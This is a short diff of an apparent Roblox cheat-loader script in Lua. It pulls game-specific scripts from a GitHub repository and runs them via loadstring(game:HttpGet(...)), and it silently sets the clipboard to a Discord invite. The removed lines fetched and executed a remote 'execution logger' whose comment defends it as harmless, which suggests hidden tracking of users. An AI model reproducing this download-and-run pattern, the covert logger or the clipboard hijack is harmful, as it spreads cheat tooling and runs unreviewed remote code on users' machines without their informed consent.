@@ -20,11 +20,6 @@ end
 local key = fetchGame(game.PlaceId)
 setclipboard("discord.gg/v3n")
 
-local syn_req = loadstring(game:HttpGet('https://raw.githubusercontent.com/Severity-svc/Ventures/refs/heads/main/Profiles/WebEnder.lua'))()--this is just a execution logger for user, not anyuthing else ( dm for proof: sentrysvc on discord )
-if syn_req then
-	syn_req:debugclient()
-end
-
 if key then
  if key == 1 then
   loadstring(game:HttpGet('https://raw.githubusercontent.com/Severity-svc/Ventures/refs/heads/main/Profiles/16732694052%20.lua'))()
